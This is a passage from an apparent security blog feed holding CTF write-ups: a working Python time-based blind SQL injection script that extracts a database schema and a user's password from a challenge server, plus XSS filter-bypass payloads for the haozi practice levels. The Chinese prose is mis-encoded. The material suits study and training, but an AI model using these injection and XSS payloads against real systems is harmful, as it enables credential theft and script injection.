title="Cosmosçš„ç•™è¨€æ¿-2"></a>Cosmosçš„ç•™è¨€æ¿-2</h2><p>è¿™é‡Œæ˜¯æ¯”è¾ƒç®€å•çš„å»¶æ—¶ç›²æ³¨ï¼Œå‡ ä¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç”¨äºŒåˆ†æ³•å³å¯è·‘å‡ºæ¥ï¼Œè„šæœ¬å¦‚ä¸‹</p><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id='</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=q80egc37cuo61j1ftstcc25ej9'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_message</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://139.199.182.61:19999/index.php?method=send'</span></span><br><span class="line">    html = requests.post(url=url, data=&#123;<span class="string">'message'</span>: <span class="string">'1'</span>&#125;, headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> max(re.findall(<span class="string">r"&lt;a href=.+method=delete&amp;delete_id=(.+)'&gt;"</span>,html))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(id=create_message(),num1=str(i),num2=str(mid))</span><br><span class="line">            requests.get(url=url+full_payload,headers=headers)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´åº“åé•¿åº¦</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">database_length_payload = <span class="string">"&#123;id&#125; and if(ascii(mid(length(database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´åº“å</span></span><br><span class="line"><span class="comment"># babysql</span></span><br><span class="line">database_payload = <span class="string">"&#123;id&#125; and if(ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´è¡¨åé•¿åº¦</span></span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">table_length_payload = <span class="string">"&#123;id&#125; and if((ascii(mid((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">table_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,table_length_payload)</span><br><span class="line">print(<span class="string">'table_length:'</span>+table_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´è¡¨å</span></span><br><span class="line"><span class="comment"># messages,user</span></span><br><span class="line">table_name_payload = <span class="string">"&#123;id&#125; and if((ascii(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'table_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,table_name_payload,int(table_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´messagesè¡¨ä¸‹çš„å­—æ®µé•¿åº¦</span></span><br><span class="line"><span class="comment"># 26</span></span><br><span class="line">column_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´messagesè¡¨ä¸‹çš„å­—æ®µ</span></span><br><span class="line"><span class="comment"># message_id,user_id,message</span></span><br><span class="line">column_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column_name_payload,int(column_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´userè¡¨ä¸‹çš„å­—æ®µé•¿åº¦</span></span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">column2_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column2_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column2_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column2_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´userè¡¨ä¸‹çš„å­—æ®µ</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">column2_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column2_name_payload,int(column2_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´userè¡¨ä¸‹çš„æ•°æ®é•¿åº¦</span></span><br><span class="line"><span class="comment"># 28</span></span><br><span class="line">data_user_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select password from babysql.user where name=\'cosmos\')),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">data_user_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,data_user_length_payload)</span><br><span class="line">print(<span class="string">'data_user_length:'</span>+data_user_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçˆ†ç ´userè¡¨ä¸‹çš„æ•°æ®</span></span><br><span class="line">data_user_payload = <span class="string">'&#123;id&#125; and if((ascii(mid((select password from babysql.user where name=\'cosmos\'),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'data_user:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,data_user_payload,int(data_user_length)))</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°<code>cosmos</code>çš„å¯†ç ï¼Œç™»å½•å³å¯å¾—åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week3_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>xssæ”»å‡»æ—¶bypassçš„ä¸€äº›æ€»ç»“</title>
    <link href="http://0clickjacking0.github.io/2020/02/02/xss%E6%94%BB%E5%87%BB%E6%97%B6bypass%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/02/02/xssæ”»å‡»æ—¶bypassçš„ä¸€äº›æ€»ç»“/</id>
    <published>2020-02-02T13:02:45.000Z</published>
    <updated>2020-02-03T05:50:24.474Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤()"></a>è¿‡æ»¤()</h1><h3 id="htmlç¼–ç ç»•è¿‡"><a href="#htmlç¼–ç ç»•è¿‡" class="headerlink" title="htmlç¼–ç ç»•è¿‡"></a>htmlç¼–ç ç»•è¿‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-ç»•è¿‡"><a href="#ä½¿ç”¨-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨`ç»•è¿‡"></a>ä½¿ç”¨`ç»•è¿‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;è¿‡æ»¤&quot;&gt;&lt;a href=&quot;#è¿‡æ»¤&quot; class=&quot;headerlink&quot; title=&quot;è¿‡æ»¤()&quot;&gt;&lt;/a&gt;è¿‡æ»¤()&lt;/h1&gt;&lt;h3 id=&quot;htmlç¼–ç ç»•è¿‡&quot;&gt;&lt;a href=&quot;#htmlç¼–ç ç»•è¿‡&quot; class=&quot;header
      
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>haozi xssåˆ·é¢˜è®°å½•</title>
    <link href="http://0clickjacking0.github.io/2020/02/02/haozi-xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://0clickjacking0.github.io/2020/02/02/haozi-xssåˆ·é¢˜è®°å½•/</id>
    <published>2020-02-02T08:21:23.000Z</published>
    <updated>2020-05-19T08:28:07.998Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xss.haozi.me/" target="_blank" rel="noopener">é¢˜ç›®å¹³å°</a></p><p><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a></p><a id="more"></a><p>è¿™é‡Œåªéœ€è¦èƒ½alert(1)å³å¯é€šå…³ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œå¯ä»¥ç»ƒç»ƒæ‰‹</p><h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å¯ä»¥è¿›è¡Œxss</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé—­åˆ<code>&lt;textarea&gt;</code>æ ‡ç­¾å³å¯ç›´æ¥å¯ä»¥è¿›è¡Œxss</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§è€ƒè™‘çš„æ–¹æ³•</p><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å…ˆé—­åˆ<code>value</code>çš„<code>&quot;</code>ï¼Œç„¶ååœ¨inputæ ‡ç­¾ä¸­åŠ è½½jsäº‹ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªéœ€è¦è¢«æ”»å‡»è€…é…åˆï¼Œå¹¶ä¸èƒ½ç›´æ¥åŠ è½½</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmousemove= &quot;alert(1)&quot; &gt;&lt;!--&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>é—­åˆinputæ ‡ç­¾ï¼Œç›´æ¥ä½¿ç”¨<code>script</code>æ ‡ç­¾</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†<code>()</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>`</code></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>server codeï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†<code>[]</code>ã€<code>()</code>ã€<code>`</code>ï¼Œå¯ä»¥ç”¨htmlç¼–ç ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'ğŸ˜‚'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯htmlä¸­çš„æ³¨é‡Šï¼Œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//               å•è¡Œæ³¨é‡Š</span><br><span class="line">&lt;!-- --!&gt;        æ³¨é‡Šå¤šè¡Œå†…å®¹</span><br><span class="line">&lt;!-- --&gt;         æ³¨é‡Šå¤šè¡Œå†…å®¹</span><br><span class="line">&lt;-- --&gt;          æ³¨é‡Šå¤šè¡Œå†…å®¹</span><br><span class="line">&lt;-- --ï¼&gt;        æ³¨é‡Šå¤šè¡Œå†…å®¹</span><br><span class="line">--&gt;              å•è¡Œæ³¨é‡Šåé¢å†…å®¹</span><br><span class="line">/* */            å¤šè¡Œæ³¨é‡Š</span><br><span class="line">æœ‰æ—¶è¿˜å¯ä»¥åˆ©ç”¨æµè§ˆå™¨çš„å®¹é”™æ€§ï¼Œä¸éœ€è¦æ³¨é‡Š</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¿™é‡Œè¿‡æ»¤äº†<code>--&gt;</code>ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç”¨<code>--!&gt;</code>ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ­£åˆ™è¿‡æ»¤æ—¶æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå³å®ƒæ˜¯åŒ¹é…<code>on****=</code>æ•´ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨<code>=</code>å‰é¢æ¢è¡Œå³å¯</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;image&quot; src=x onerror</span><br><span class="line">        =&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†<code>&lt;&gt;</code>å†…çš„æ‰€æœ‰å­—ç¬¦ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å½“æ ‡ç­¾ä¸º<code>&lt;img</code>æ—¶ï¼Œä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºçš„ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¡¥å…¨æ ‡ç­¾</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&lt;!--</span><br></pre></td></tr></table></figure><h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªè¦æ±‚äº†åŒ¹é…å®Œæ•´çš„<code>http://www.segmentfault.com</code>æˆ–è€…<code>https://www.segmentfault.com</code></p><p>è¿™æ ·çš„è¯ï¼Œå¦‚æœç½‘ç«™èƒ½å¤Ÿè®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŠ è½½<code>onload</code>äº‹ä»¶ï¼Œå¦‚æœä¸èƒ½ç½‘ç«™è®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŠ è½½<code>onerror</code>äº‹ä»¶</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.segmentfault.com1&quot; onerror=&quot;alert(1)</span><br><span class="line"></span><br><span class="line">https://www.segmentfault.com&quot; onload=&quot;alert(1)</span><br></pre></td></tr></table></figure><h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line"> 